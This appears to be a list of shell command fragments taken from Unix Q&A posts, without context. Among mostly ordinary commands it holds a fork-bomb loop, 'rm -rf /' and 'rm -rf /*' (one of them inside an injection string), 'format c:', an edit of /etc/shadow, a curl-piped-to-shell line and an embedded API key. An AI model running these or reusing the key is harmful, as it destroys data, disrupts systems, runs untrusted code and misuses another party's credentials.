sh -x scriptname.sh 2>debugoutput.txt
ls *
Command too long
has space
javac -version
/bin/sh -s
file . -name "c**_data.txt" | grep 4
ls -R | grep -e 'c[4-7][0-9]_data.txt'
time _command_
'Quick Edit'/'Insert'
"Administrator:Windows PowerShell"
"Select Administrator:Windows Powershell"
ps -aux
--width n
ps aux
ps aux
ps aux
man ps
ps aux | grep ffmpeg
ps -A -o args,pid,lstart
ps -A -o pid,lstart,args
ps -ppid ...
for line in sys.stdin:
less -S
df $path
awk '{print $1}'
awk '{print $NF}'
readlink -f
wget --timeout=10
preg_split("/\s+/", $sValue, 3)
man xargs
alias hi='TEST=ok ;echo $TEST'
TEST=ok ; echo $TEST
echo {} | sed s/.so/.dylib/
ext-rename [ext1] [ext2]
ext-rename so dylib
ls -laG
ls -laG foo/bar
this or that
printf '%s'
grep -q
grep -E
mkdir -p
find . -not \( -type d -name ".?*" -prune \)
find . -not \( -type d -name ".*" -prune \)
set -e
svn update
|| exit 0
set -e
svn up
svn export
mv current old ; mv new current
svn up
trap func_trap INT TERM EXIT
echo -n $i
do ... done
$prompt: /path/to/script
sh scriptname.sh
chmod +x name_of_your_file_script
chmod +x your_filename.sh
$ sudo ./your_filename.sh
cd Directory_name/write the complete path
echo $PATH
~/bin 
#!/usr/bin/env bash
#!/usr/bin/env python3
shred --remove <file>
echo "04:20:40" | sed -E 's/(.*):(.+):(.+)/\1*3600+\2*60+\3/;s/(.+):(.+)/\1*60+\2/' | bc
youtube-dl --get-duration
export PS1="[myshell]"$PS1
man test
man [
( )
python -
here document
process substitution
here document
python -c
arp -a
man find
chmod a+x cpr
. ./script.sh
source ./script.sh
function myfunc() { echo "Here in myfunc" ; }
'{print $11}'
pgrep -x foo
stty -a
export LINES COLUMNS
from="automated.machine.com" ...
expr STRING : REGEX
(( ))
Arithmetic Evaluation
expr 09 + 0
xsel -i
xsel -o
if [ file.txt ]
find / -newer sshh > file.txt
\( \)
command || exit
grep -F
Invalid argument
$ perror 22
awk  -v pat="$strError" '$0 ~ pat{print $3}' $errorDir/errno-base.h $errorDir/errno.h
apt-get install moreutils
unsigned char
errno -l
errno -l | sort
php /home/calculatedata.php
while true; do while true; do :; done & done
killall bash
man [curl|wget]
*/5 * * * * /{path_to_folder}/checkBootAndRestart.sh 
chmod +x script.sh
twig handlers
./myscript somefile.xml
print $_ -> text,"\n"
cat file.xml | sed -ne '/<pattern_to_find>/s#\s*<[^>]*>\s*##gp'
date +%Y
cvs status
xdg-mime query filetype <file>
yum install xdg-utils.noarch
text/plain; charset=us-ascii
ASCII text
set --
net use /user:"Someone" \\\\server\\share
net use /user:"Someone" '\\server\share'
C:\Program Files\Git\delete
rm -r
kill $PID
~/.ssh/rdp-tunnel.sh ACTION TUNNELNAME LOCAL_PORT:REMOTE_SERVER:REMOTE_PORT TUNNEL_PROXY
~/.ssh/rdp-tunnel.sh start "%g-%p" 63394:192.168.8.176:3389 tunnel-name-1
~/.ssh/rdp-tunnel.sh stop "%g-%p" 63394:192.168.8.176:3389 tunnel-name-1
cat /proc/$pid/smaps
{ 0..10 }
echo $SHELL
-caption ""
extra_args=( "${extra_args[@]}" -caption "$1" )
$if mode=vi
cvs co -r TAG
cvs log
sed -e "s/\*DIVIDER\*/$DIVIDER/g"
wait n
set -o emacs
shopt -u nocasematch;
declare +c string
a="Hi All"
lcase a
a=$( echolcase "Hi All" )
lowercase 'my STRING'
var="$(lowercase $str)"
adding 32
subtracting 32
'A' -to-> 'a'
97 - 65 = 32
printf -v
1.85 GB
mawk 1.3.4
mawk 1.9.9.6
macosx nawk
1.85 GB
shell variable(s)
single quote escapes
man tee
-e . -e .
. .
sh test.sh
STR "=" "foo"
STR "=foo"
STR="" foo
STR = "foo"
bash second.sh
echo $!
alias emacs=emacsclient -c -a ""
man emacsclient
touch ~/.commands
man bash
man find
find . -name *.sql -print0 | xargs -0 -n1 dirname | sort --unique > folders.txt
SAD=(date +%A-%B-%d-%Y)
date +%A\ %B\ %d\ %Y
ps --ppid
#connect to $machine and execute the script script2execute.sh
ssh $machine bash script2execute.sh
# store your time on a file( or even a variable as you wish)
date > TIME.txt
./script |& sed
tail -f nohup.out
cmd1 2>&1 | cmd2
-f html
svn info
revision="$(svn info http://svn-repository/trunk | grep "^Revision:" | cut -c 11-)"
-exec rm \{\} ;
defaults write com.apple.dock workspaces-app-bindings -dict-add com.apple.safari 4
mimencode -b
mimencode -b -u
[ ]default=no[ ]
[ ... ]
test ...
int main()
cat file | grep string > new_file
Array1 - Array2
key1 < … < key9 > key10
| sort -u
"key7" "key8" "key9" "key10"
git pull
git status
git branch -a
unset GIT_DIR
find . | grep -v \.svn
find -prune
find ... -exec grep ... +
find ... | xargs egrep ...
find ... -print0 | xargs -0 egrep ...
find ... -exec grep ... \;
find ... -exec ... +
find | xargs
find | xargs
find ... -print0 | grep -v '/\.svn' | xargs -0 egrep ...
find | grep | xargs
find | grep
git grep
find . -type f -name 'messages.*'
-type f -name 'messages.*'
find . -type d -name '.svn' -prune
find . -type d -name '.svn' -prune -o -name 'message.*' -exec grep -Iw uint {}
-name 'message.*' -exec grep -Iw uint {}
-type d
find . -name '.svn' -prune -o -name 'message.*' -exec grep -Iw uint {}
find . -name '.svn' -prune -o -name 'message.*'
-name '.svn' -prune -o
find . -name '.svn' -prune -o -name 'message.*' -print
var = value
ps -elf | grep lock_input
./username file
read line
exp_internal 1
grep --color WORD * | grep -v AVOID
ls | grep FILE
grep --color=always
grep --color=always
-ve '12'
grep WORD * | grep -v AVOID | grep -v AVOID2 | grep WORD
| grep
xargs -0
sed: xregcomp: Invalid content of \{\}
# Does not work
sed 's/'"$line"'/replaced/' < my_searches
echo "$line" | awk '{gsub(".", "\\\\&");print}'
echo $ES
awk '{gsub(".", "\\\\&");print}'
"I didn't", said Jane O'Brien.
\"I\ didn\'t\"\,\ said\ Jane\ O\'Brien\.
while read line
:set writebackup backupcopy=no
M-x customize-variable break-hardlink-on-save
echo $(cmd)
read line
complete -F _your_func
-o nospace
-e ('s/[^\/]$/& /g')
-o nospace
compopt -o nospace
2 > 1
info bash
command 2> >(grep -v something 1>&2)
perl -MList::Util=shuffle -e'print((shuffle<>)[0])'
perl -e'print$listall[$key=int rand(@listall=<>)]'
listall | awk 'BEGIN { srand() } int(rand() * NR) == 0 { x = $0 } END { print x }'
$ listall | randomline.sh
listall | sort -R |head -n 1
file2 = sys.stdin
/usr/local/bin/rcssserver include='/home/joao/robocup/runner_workdir/server_official.conf' server::team_l_start = '/home/joao/robocup/runner_workdir/a.sh' server::team_r_start = '/home/joao/robocup/runner_workdir/b.sh' CSVSaver::save='true' CSVSaver::filename = 'out.csv'
bash -x script
echo XYZ_20200824.zip | grep -Eo '[[:digit:]]{4}[[:digit:]]{2}[[:digit:]]{2}'
cmd=$(echo XYZ_20200824.zip | grep -Eo '[[:digit:]]{4}[[:digit:]]{2}[[:digit:]]{2}')
echo $cmd
if [[ expression ]]
set -x
open_an_editor file.ext
smth=$(open_an_editor file.ext)
./script.sh "A value"
cat filename
open_an_editor filename
nano "$1" 3>&1 1>&2 2>&3
#!/bin/sh -e
grep -rn "search terms" *
vim *.php
:set hidden
:argdo %s/foo/bar/g
:help vimgrep
:help argdo
:help argadd
screen -m -d $command$
screen -r
man screen
strace -f myscript
man 3 strftime
| sh
echo ile
find /dir/ -perm /0020
while read
<( commands )
apachectl -v
END OF THE WEEK
cat /tmp/list.txt
sleep 1;
cat /tmp/list.txt
$ man osascript
echo "yes"|./interactive-installer
printf "\033[5A"
printf "\e[5A"
echo -e "\033[5A"
echo -ne
tr -d '"' < uBXr0r15.txt | date +%Y-%m-%d -f -
date "..." -d "..."
let ...
(( ... ))
$(( num / div ))
bc -l
X / Y
(X + Y - 1) / Y
X = k * Y
(k * Y + Y - 1) / Y
(k * Y) / Y + (Y - 1) / Y
(Y - 1)/Y
X = k * Y + m
0 < m < Y
k * Y + m + Y - 1
k * Y + Y + m - 1
(k * Y)/Y + Y/Y + (m - 1)/Y
0 < m < Y
0 <= m - 1 < Y - 1
(m - 1)/Y
(k * Y)/Y + Y/Y
k + 1
k + 1
round 6 12
round 5 12
5/11 < 5.5/11 (exact middle) < 6/11
round 5 11
round 6 11
bash --version
GNU bash, version 3.2.48(21)-release (i686-pc-cygwin)
X = 20
Y = ~X = DF
|| exit 1
git status
set -e
echo done>debug.log
## /home/username/twittercron
getline t <"file1"
foreach i in user_*; do cat $i | ./fetch_contact.php ; done;
cat user_* | ./fetch_contact.php
cd ...
cd -
pushd <dir>
cd <dir>
tail -f
<rvm version and gemset> <computer name> <current folder> <git branch>
renametab mytabname
\e]0;BASH: \u@\h\a
BASH: \u@\h\
BASH \v: \u@\h:\w\n\$
BASH \v:
ls /bin/[
test 5 ==
$(( EXPRESSION ))
1 && 1
The token '&&' is not a valid statement separator in this version.
Get-ChildItem \, nosuchfile
ssh $USER@some_host 'qsub $working_dir/some_file.txt'
working_dir: Undefined variable.
ssh $USER@some_host "qsub $working_dir/some_file.txt"
touch "$temp"
echo "$result <= $key1" | bc
sudo apt install bc
man bash
eval echo "'keep   my     spacing'"
set -x
$(dirname {})
-exec echo .
basename {}
find /home/kibab -name '*.png' -exec echo '{}' ';'
$(dirname {})
echo .
basename {}
$(basename {})
$(dirname {})
echo {}
pv -c
tp filename
cat file.txt | grep [[:alpha:]]* -o
grep PATTERN file
cat file | grep PATTERN
grep '[[:alpha:]]*' -o file.txt
grep -E '[[:alpha:]]+' -o file.txt
2>&1 & echo $!
chmod +x /usr/local/sbin/symfony-build
sh script.sh
curl "https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&key=AIzaSyDBgL8fm9bD8RLShATOLI1xKmFcZ4ieMkM&sensor=true" --data-urlencode "`nmcli -f SSID,BSSID,SIGNAL dev wifi list |perl -ne "if(s/^(.+?)\s+(..:..:..:..:..:..)\s+(.+?)\s*$/&wifi=mac:\2|ssid:\1|ss:\3/g){print;}"`"
"status" : "OVER_QUERY_LIMIT"
for entry in *
for entry in *
echo *
test -d
-maxdepth 1
-type f
-not -path '*/\.*'
sed 's/^\.\///g'
sort -V
-type f
-type l
-type d
-mindepth 1
-type f,l
read -r
read -r
read -r
read -r
ls -1
mapfile --help
help mapfile
grep -q
tput setf 0
tput setf
echo -n
awk {print}
tr -d '\012'
$ ack funcion_name
cat <file> | grep <"text">
test $?
if grep ...
line=$(awk 'NR==1 {print; exit}' file)
line=$(sed -n '1p' file)
seq 10
man kill
set -x
exec "$0"
"$0"; exit $?
echo "word1 word2"
-f 1
-d " "
%% *
[ -z "$variable" ] && variable="defaultValue"
[[2 eq 2]]
( ! condition ); variable=$?
! ( condition ); variable=$?
variable=$(( 1 == 1 ? 1 : 0 ))
myvar="default" && [[ <some_condition_is_true> ]]  && myvar="non-default"
{ variable=$1; shift; }
variable=$(find / -type f -name ListOfFilesWithThisNameOnMySystem)
[ -z "$variable" ] && variable="defaultValue"
Kilo Bytes
Mega Bytes
Giga Bytes
select count($select) from $mysqlTable where nameTXT='tests';
< <(...)
diff <(command1) <(command2)
tree -R /
ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'
cd ./a/d
find -exec
mesg y
mesg n
ls -l *
ls -l
39 root     root        1024
ls -latrh
for i in file.txt ; do sort -k5n $i ; done
O(n log n)
grep -e
sh: source: not found
bash: source: command not found
echo $0
cat /etc/shells
apt-get install bash
exec /bin/bash
chsh -s /bin/bash
find . -name {expr}
grep -r {expr} *
sed i 's/find/replace'
% for f in *; do cp "$f" "../backup/$f" ; done
% cp * ../backup/
echo abcd
echo efgh
chmod u+x scriptname.sh
rm "$folderToBeMoved"
folder = "ABC"
[ -f $newfoldername/Primetime.eyetv]
[-f $newfoldername/Primetime.eyetv]
$(cat file)
var=$(cat text.txt)
echo $var
sed -e 's/weblogic.policy//' -e 's/security\///'
$ sh ./script.sh   # Don't do this!
... >> "${OUPUT_RESULTS}"
application$(date +%Y%m%d%k%M%S).log
application$(date +%Y%m%d%H%M%S).log
' 9'
echo $(date +%Y%m%d%k%M%S)
20140626 95138
echo $(date +%Y%m%d%H%M%S)
vim a.sh
(logit="/home/ubuntu/test.log" && echo "a") >> ${logit}
chmod +x a.sh
logit="/home/ubuntu/test.log" && (echo "a") >> $logit
"input.txt" = x
"output.txt" = y
echo "text" > {f1,f2}.txt
-bash: {f1,f2}.txt: ambiguous redirect
tee -a
echo "MY_VAR=foobar" >> $GITHUB_ENV
my_script=$(pwd)/$(basename $0)
seq [first [incr]] last
mktemp -d
mktemp -d
> file.out
> file
: > file.out
: > file.out
sed '/,//' < file
sed '/^,//' < file
grep --help
[ expr ]
test expr
[ expr ]
[ expr ]
sed -e 's/(^[0-9:.])./\1/' urfile
/usr/ucb/ps auwwx | grep weblogic | tr ' ' '\n' | grep security.policy | grep domain | awk -F'=' '{print $2}' | sed -e 's/weblogic.policy//' -e 's/security\///' -e 's/$/somefile.cf/' | sort | uniq
$Revision 2.1 $
find -writable
find . -type f | while read f; do touch -r "$f" "$f" && echo "File $f is writable"; done
find -writable
touch -r
find . -type f -perm /+w
== user@server.com
kill -9 $$
. /etc/init.d/functions
rm -rf
echo http://example.com/index.php | sed -e 's#^https://\|^http://##' -e 's#:.*##' -e 's#/.*##'
http://example.com/index.php, http://example.com:4040/index.php, https://example.com/index.php
extractHost "docker://1.2.3.4:1234/a/v/c"
-i ''
cat << EOF
man bash
cat <<EOF
cat <<EOF
echo -e "$sql"
man bash
Ctrl + V <tab>
<< EoF
cat << EoF
bash -c
/bin/bash -O expand_aliases -c 'xx'
tail -n +2
rm (!$F)
| grep -v '^--$'
convert file1.pdf file2.pdf - | pdf2ps - - | lp -s
-o -
-dNOPAUSE -dBATCH -sOutputFile=/dev/stdout
comm: file 1 is not in sorted order
g++ -O3 -march=native -o set_diff main.cpp
set_diff B A
A B
uniq -u
bash -e
$'this form'
gcc -o output -Wall -Werro
history >history.tmp
fg 1
:tabedit history.tmp
HISTTIMESTAMP='' history
:help :substitute
history -w
:r ! tail -20 ~/.bash_history
i=$((j + 1))
help "(("
let EXPRESSION
Is the use of a tool like bc mandatory for floating point arithmetic?
. ~/.bashrc
exec bash
. ~/.bashrc
source ~/.bashrc
exec bash
exec "$BASH"
exec $SHELL
. ~/.zshrc
exec bash
exec "$BASH"
exec bash
exec -c bash
export A=1
exec bash
A == 1
exec -cl bash
exec "$BASH" --login
source ~/.bashrc
source /etc/bash.bashrc
exec bash
set -x
set -x
from # till end-of-line
$(: ...)
a && b
ps -ef
python program.py
kill -2 $pid_of_script
kill -2 $pid_of_script
info bash
man bash
kill -s SIGINT
trap 'Cleanup' SIGINT
kill -s <signal> pid
sleep 5
sleep 5
result=`rsync --del -az -e "ssh -i $cert" $source $destination 2>&1` 
mv incoming/* archive/
pidof -x test.sh | wc -w
if [ 1 -eq 1 ]
{"/bin/csh", "-c", "echo hello"}
su -c otherscript userid
<< EOF
su -c
exec("bash initial.bash");
ssh otherMachine temp.bash&
ssh otherMachine temp.bash&
ssh othermachine temp.bash >/dev/null 2>&1 &
new java.text.SimpleDateFormat("MMDDyyyy_HH:mm:ss")
new java.text.SimpleDateFormat("MMddyyyy_HH:mm:ss")
physics 1b.sh
" physics 1b"
echo $x
ls -A
find -print0
xargs -0
trap 'echo interrupted; exit' INT
set -e -o pipefail
(( ))
echo $(( `date +%s\`+10 ))
echo $(( `date +%s\`+(60*60) ))
* * * * *  ~/.class/test.sh >> ~/.class/test_out 2>&1
sed s,"<URL>",\""$url"\", template.txt > test.sh
--maxredirs [n]
comm1 && (comm2 || comm3) && comm4
$RANDOM + 2000
VAR=$(shuf -i 200-700 -n 1)
head -200 /dev/urandom | cksum
3310670062 52870
head -200 /dev/urandom | cksum | cut -f1 -d " "
head -200 /dev/urandom |cksum | cut -f1 -d " " | awk '{print $1%63000+2001}'
sh build.sh
./make install
$( ... )
series | of | commands
which php
echo $PATH
chmod a+x test.sh
remote_ssh.sh node5 "echo hello world"
<b id="Test Step">
-cmin -n
python -c
#!/usr/bin/env zsh
! ? *
realpath -f
readlink -m
readlink -f
ln -s
relpath / /
relpath a a
readlink -m
readlink -m
readlink -f
readlink -m --
./compute-relative.sh "/a/b/c/de/f/g" "/a/b/c/def/g/"
CT_FindRelativePath "/a/b/c/de/f/g" "/a/b/c/def/g/"
pure bash
import os, sys
\( \)
while read -r; do ... done
while read -ar; do ... done
echo 1 ; echo 2 ; echo 3 ; echo 4 ; echo 5
echo 1 2 3 4 5
-P MAX-PROCS
while read
find $HOME/.junk -type f | wc -l
cd /
tput u7
printf "\033[6n"
touch .dummy
vim file.php
vim file.html
vim file
:set syn=sh
# bash
:help modeline
:set ft=bash
:syntax on
set ft=sh
let g:is_bash = 1
:help ft-sh-syntax
filetype on
set ft=sh
:h filetype
syntax enable
:filetype detect
done < file
cat file | while
mv - move (rename) files
mv tt.pl re.pl perl/
$ sed 's/cat/dog/' manipulate > tmp && mv tmp manipulate
$ sed -i 's/cat/dog/' manipulate
i, in, and ni
in, ni, and i
inni, inin, and nini
require 'cl
\,(if \1 "in" (if \2 "ni" "i"))
-config FILE
-passin PWD
-passout PWD
yes | your_script
man 5ssl config
LD_LIBRARY_PATH=/copied/to/path/lib /copied/to/path/bin/cp
echo -E
echo -nE
break 2;
bash -x
set -x
string1 == string2
(( ... ))
[[ ... ]]
[ ... ]
/var/www/hash_info.py /var/www/Muha_Album.7912.torrent
apt-get install python-gtk2 python-glade2
chmod 744
ls /dev/usb | grep 'egalax_touch\|quanta_touch'
set -e
sed -e 's,.*|\(.*\)|.*,\1,'
od -xcb
od -xcb
perl -v
use 5.008009;
exec command [arguments]
exec $@
date >> /home/example.com/test.txt
$(fc -l -1)
fc -l {start} [{end}]
man zshexpn
$(echo '\t')
bash -eu
echo '\t'
sudo -u ./eggdrop .
sudo -u
sox -t alsa default ./recording.flac silence 1 0.1 5% 1 1.0 5%
s over the lazy dog
over the lazy dog
$ ls
dircolors --print-database
alias ls='ls -F'
source ~/.bashrc
man mkfifo
ncftpls -R
ls -R
ls -lR
if [[ grep -c "alias" ]] then <print file name>
alias | grep name_of_alias
alias | grep mysql
which name_of_alias
hexdump -C
< "$file" od ...
-t x1
-A n
echo "$(hget capitols France)"
hget capitols France
export PATH=$PATH:/path/to/bindir
echo $SHELL
( cat inputfile  ; echo -e "\032" ) | ./prog
killall some_monitor1.sh
kill -- -1234
sed 's/\|\|*/\t/g'
<file awk
awk file
cat file | awk
| sort -k1,1
join <( some command ) <(some other command)
-j1 -o1.2,1.3,1.4,1.5,2.5
-f -
sort -u
{print $1 "\t" $2 "\t" $3 "\t" $4 "\t" $7-end "\t" $7}
Can't open foo: No such file or directory.
Git Bash.vbs
C:\Program Files (x86)\Git
wscript "C:\Program Files (x86)\Git\Git Bash.vbs" "%1"
Git Bash.vbs
Git Bash
Git Bash.vbs
C:\Windows\System32\cmd.exe /c "%USERPROFILE%\Desktop\GIT Shell.lnk"
END OF SUMMARY
grep -e '[$subtext]'
grep -o
man zshbuiltins
echo "81 4 6 12 3 0" | tr " " "\n" | sort -g
man sort
xargs -n1
ulimit -f 32
python pywhich os django PIL
:h last-position-jump
vim -c "
screen -r mysession
echo $(c($x))
ls -R /var/log >~/lsout.txt
find /var/log -print >"$HOME/lsout.txt"
ls -R
ls -R /var/log/ > /home/bqiu/lsout.txt
ls -R /var/log/ > ~/lsout.txt
Run a recursive listing of all the files
ls -R
ambiguous redirect
ssh-keygen -lf -
tail -n 1 my_file.txt
tail -r
tail -r
tac $FILE | grep -m 1 '.'
keymap emacs
show-mode-in-prompt on
ls --indicator-style=none
bash --version
ls --asdf
echo something >&2
ec2-run-instances ami-dd8ea5a9 -K pk.pem -C cert.pem --region eu-west-1 -t c1.medium -n 1
$echo '-n'
printf '%s\n' -n
myshell date1 date2
for a in "$@"
(exit 0)
grep . < <(pwd) > /dev/null
while read a; do :; done < <( pwd)
$line = s/^\s+[0-9]+//;
@Ian Bicking
file in.csv
perl -F, -lane 'print $F[0]' in.csv > out.txt
pdf2swf test.pdf test.swf
pdf2swf test.opt.pdf test.swf
exit 2
[ "$?" -ne 0 ] && exit 2
Password: 
kill PID
seq 1 $num_days
date +%Y/%m/%d -d "${start_date}-${i} days"
\\ \\\\ \\\\\\\\
command substitution
expression substitution
are all special and
--max-redirect 0
curl -I <URL>
curl -IL <URL>
$(basename "${s%.*}")
$(basename "${s}" ".${s##*.}")
man bash
echo -e
sed -i '' -e...
GMT Daylight Time
some_other_condition -o -o some_other_condition2
Check files for difference in bash
Code tested on RHEL/CentOS Linux (6.X and 7.X)
ami_id=$1; type=$2; ...
export var=$var
export var
| sort
s3cmd ls
s3cmd ls s3://path/to/file | sort
echo '"my string"'
echo "\"my string\""
"\n "
echo -e
printf -v VAR
help printf
printf [-v var] format [arguments]
[-v var]
perl -e
echo testFile.txt.1 | cut -c14-
echo testFile.txt.1 | cut -c1-13
echo testFile.txt.1 | perl -e 's/^[^1]*//;'
echo testFile.txt.1 | perl -e 's/1.*$//;'
echo testFile.txt.1 | perl -e 's/\d//g;'
echo testFile.txt.1 | tr -d "[0-9]"
echo testFile.txt.1 | perl -e 's/\.[^.]+/./;'
$0 == bash
unsetopt functionargzero
$_ == $0
ps ho cmd $PPID
[[ $0 != "$BASH_SOURCE" ]] && sourced=1 || sourced=0
(return 0 2>/dev/null)
return [N]
[[ $0 != "$BASH_SOURCE" ]]
bash my-script
(return 2>/dev/null)
set -e
bash -x script
bash -c 'someotherscript "$@"' main-script args..
( exec -a '' /bin/bash ) <script
eval "`cat script`"
( return 0 )
bash -x script 1 2 3
script 1 2 3
bash -x "`which script`" 1 2 3
bash -xc '. script' "`which script`" 1 2 3
bash script 1 2 3
( exec -a none script )
curl https://example.com/script | $SHELL
$SHELL -c '. script && main'
{ curl https://example.com/script && echo && echo main; } | $SHELL
$SHELL -c 'eval "`curl https://example.com/script`" && main'
echo 'eval "`curl https://example.com/script`" && main' | $SHELL
[[ $_ == "$(type -p "$0")" ]]
curl ... | bash -s -- ARGS
type -p "$0"
return 0
return 1
__name__ == "__main__":
if __name__ == '__main__'
ssh host ls -lh
ifconfig | grep inet
standard input
./read.sh <data
tail -n 1
xdg-open http://google.com
) is run and the output is passed as argument to
svn status
echo $?
svn status
svn status
svn status -q
svn status -q
svn status -q
svn st -q
cut -c -8
sed '/^[^ ]*$/d'
grep -m 1 '[^ ]'
while ! mysqldump .....; do :;done
foo | bar
pushd dir
cd dir
cd ~#
set dunique
grep -v
--exclude PATTERN
'! */'
'hide,! */'
-path '\*/train*.*' -prune
<!-- BEGIN realm -->
<!-- END realm -->
/BEGIN realm/
BEGIN realm
BEGIN realm
/END realm/
<!-  BEGIN realm -->
<!-- END realm -->
<!-  BEGIN realm -->
<!-- END realm -->
tar tvf mytar.tar
ls -R
ls -R
seq n
ghci -e
-j 4
require 'rubygems'
puts "hi"
rails console
sleep 10
sleep 10s
(( $#_elapsed > 1000 )) && set -A _elapsed $_elapsed[-1000,-1]
typeset -ig
set -A var ...
var=( ... )
setopt inc_append_history_time
history -D
sleep 5 &
[ "x" = "x$RAB..."]
"x$a" = "x$b"
"$a" = "$b"
bash -x $script
find | while read
find | while
find ./ -name "* *" -type f -d 1 | perl -ple '$file = $_; $file =~ s/\s+/_/g; rename($_, $file);
${f// /_}
for i in *' '*; do rename.ul ' ' '_' *; done
. ~/bin/sourcecsh
ls -1
ls -1
for ...
tr \\n \\0 <file
flock -x 6
./file: line 2: [: -ne: unary operator expected
if [  -ne 0 ]
Certificate was added to keystore
netstat -t 1 -i 2>&1 > $NETStat_OUT_FILE &
X >= 0
tot - a
mysql -uanon -ppwd -db mydb -e "select count(*) from table1"
ls -la bash* .bash*
cat $1 | while ... done
while ... done < $1
shopt -s extdebug
mkdir $deploydir
mkdir: missing operand
mkdir "$deploydir"
mkdir ""
mkdir: cannot create directory
mkdir "$deployDir"
/bin/sh -x ./yourscript.sh
ARRAY1=($(ls "$BaseDir/$ServerMount/$Dispatch"))
echo ${list[@]}
for (( i=0;i<$DRIVES;i++)); (( i=0;i<$SERVERFOLDER;i++));
test=hello world
set +m
[[ -p
cat -
cat -
xxd -r infile outfile
/path/to/notify-send "x New Posts"
which notify-send
chmod u+x path/to/hi
chmod a+rx path/to/hi
find -L
set -f
set +f
#!/bin/bash -f
./a.out 123 *
bash -f
ssh -f -T ${USAGE_2_USER}@${USAGE_2_HOST} ${CMD}
-f -T
argc = 1
argv[0] = "ls -ltr"
argc = 2
argv[0] = "ls"
argv[1] = "-ltr"
ls -1
ls -m
", "
a, b, c
ls -m
a b c
ls | xargs
ls | paste -sd'|'
/bin/bash make
( ... )
{ ... ; }
git status
git status
for /f
for /?
for /f
cmd.exe /c echo Test
for /?
for /f
for /f
kill -9 {processID}
ps -ef | grep gedit
kill -9 <pid>
"gedit file.txt"
cat one
cat two
cat one
declare -a varname
chmod +x
chmod +x scriptname
bash scriptname
sh scriptname
find ./ ! -name "filename"
grep -Ri something .
echo "$x"
1 2 3
a b c d
"test 1\ntest 2"
testvar=$(cat test.txt)
egrep '(bob|bill|sarah|sal):' etc/shadow >> /etc/shadow
head -10 file | tail -1
skip=<line_no - 1>
cd -
some stream generating command | vim -
ls [0-9]*
foo="./RetVar.py 42"
$. script.py
s/ ... / ... /g
\( ... \)
basename $0
basename /some/really/long/dir/path/myscripts/coolscript.sh
basename $0
-n EXCLUDE
find <dir> -type f
find test -empty
find test -type f
findempty "$dir"
[ $(find your/dir -prune -empty) = your/dir ]
find -prune
find -maxdepth 0
find -type d
find -empty
(( ${#files} ))
[ $(ls -A your/dir) ]
rmdir *
find . -type d -empty
printf("%c[1;32mHello, world!\n", 27);
ssh -tt -p $r host
find ... | while read ...
echo -e "\033[1;32m$x:\033[0m";
ln -s
sed s/_/-/
ls ... | grep ...
declare -U
ps -ax | grep PROCESS_NAME
" grep "
man paste
grep -f
for r in range(runs):
import reads.py
runs = 5
n_{i+1} = \floor{ 3/2 * n_{i} }
a(n) =A061419(n)+1
chmod +x series.bc
(series 100000)
(series 1000000)
chmod + x
chmod +x script.sh
type export
. ./mono-2.6-environment
format c:
sudo apt-get install dos2unix -y package
while read
DELIM="$(printf "\377")"
bash -x
if [[ ! ${git_status}}
" parse error near }
git status
failed to compile regex: illegal byte sequence
git status
python -c
echo "a b c d" | read X Y Z V
echo $X
echo "a b c d" | ( read X Y Z V; echo $X )
set -x
set -o xtrace
set -v
set -o verbose
set +x
set +v
#!/bin/sh -x
set -x
set -x
set -x
set +x
set +x
set +x
set verbose
set echo
Special shell variables
{ set +x; } 2>/dev/null
exit $STATUS
. /home/db2v95/sqllib/db2profile
import ibm_db_dbi
os.system(". /home/db2v95/sqllib/db2profile")
subprocess.Popen([". /home/db2v95/sqllib/db2profile"])
No such file or directory
. /home/b2v95/sqllib/db2profile
find . -type f -exec sed -i 's/old-word/new-word/g' {} \;
echo $PATH
set -e
set -e
set -e
set -x
set -e
set -e
if [ ... ]
set -e
set +e
-o pipefail
-o (for option) pipefail
man bash
set -e
test in a if statement
final && or ||
any command in a pipeline but the last
set -e
test -d
set -e
echo "$string" | tr 'x' '_' | tr 'y' '_'
2>&1 |
if ! test $x -eq $y
if test ! $x -eq $y
bash -x script.sh
python -m trace -t main.py
\ 
[[ ]]
[$# -ne 1]
tail -n 500 filename > filename
getch -s
getch master
getch -s master
getch -s master
read -p 'Chinese: ' s && echo $s
declare -r
declare -i
declare -ri
man test
if [ -z "$NAME" ]; then ...
export PGPASSWORD="$put_here_the_password"
pg_dump -Fc
pg_dump [params] < [path to file containing password]
crontab -e -u postgres
VAR="val" 
pg_dump --dbname=postgresql://username:password@127.0.0.1:5432/mydatabase
0 3 * * * pg_dump --dbname=$MYDB | gzip > ~/backup/db/$(date +%Y-%m-%d).psql.gz
host <you_db_name> <you_db_owner> 127.0.0.1/32 trust
pg_dump -h 127.0.0.1 -U <you_db_user> <you_db_name> | gzip > /backup/db/$(date +%Y-%m-%d).psql.gz
u=rw (0600) or less
echo $HOME
chmod 0600 /home/ubuntu/.pgpass
(flock NUM; ...) NUM>FILE
tar cvf test.tgz -C ../.. other/dir
date +%H
eval "echo ..."
echo "$@";
-f 2-
-d " "
foo; rm -rf /; echo
. .[a-zA-Z0-9]*
chmod g+w .*
ls -A my_directory
['/bin/sh', '-c', 'cat copy.txt > copy.log'].execute().consumeProcessOutput(System.out, System.err)
new File('copy.log') << new File('copy.txt').text
set ANT_OPTS=-Xmx512M
read -r
; echo -n a
echo -n "${line:0:-1}"
${HOME:0:$(echo 10)}
$ cat code
$ cat template
%x[ ]
rvm list
rvm -v i
"ls -l"
rm -rf /*
nc shldvgfas005 6153 <  temp.6153
sudo tlmgr show flatten
tlmgr: cannot find flatten
Unix script file (*.sh;*.bsh)
chmod 755 the_script_filename
sed -i s/{ctrl+v}{ctrl+m}// {filename}
:0 -multiwin
\[\e]0;\w\a\]\n\[\e[32m\]\u@\h \[\e[33m\]\w\[\e[0m\]\n\$
expand -t
[ ${#newPWD} -le ${pwd_length} ]
jobs -p
stress --cpu 2 --timeout 60
sha1sum /dev/zero
sha1sum /dev/zero | sha1sum /dev/zero
dd if=/dev/zero of=/dev/null
304 Not Modified
200 OK
304 Not Modified
find <path>/200506* -type f >> jun2005.lst
if[ -d 200506* ]
sed -i 's/$OLD_URL/$NEW_URL/g'
sed -i 's|$OLD_URL|$NEW_URL|g'
1=1 and (0=1 or 1=1)
[1 ...
[ 1 = 01 ]
sleep infinity
sleep infinity
tail -f /dev/null
grep a
tail -f /dev/null
strace tail -f /dev/null
sleep infinity
strace sleep infinity
bash 4
bash 4
touch "$HOME/.pause.fifo"
exec python -c ...
sleep infinity
struct timespec
struct timespec
